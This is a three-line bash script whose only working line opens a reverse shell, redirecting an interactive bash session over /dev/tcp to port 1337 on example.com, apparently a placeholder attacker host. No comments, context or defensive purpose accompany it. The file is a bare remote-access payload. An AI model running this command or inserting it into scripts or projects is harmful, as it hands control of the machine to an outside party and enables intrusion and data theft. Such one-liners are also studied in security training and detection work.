#!/bin/bash
bash -i >& /dev/tcp/example.com/1337 0>&1
wait
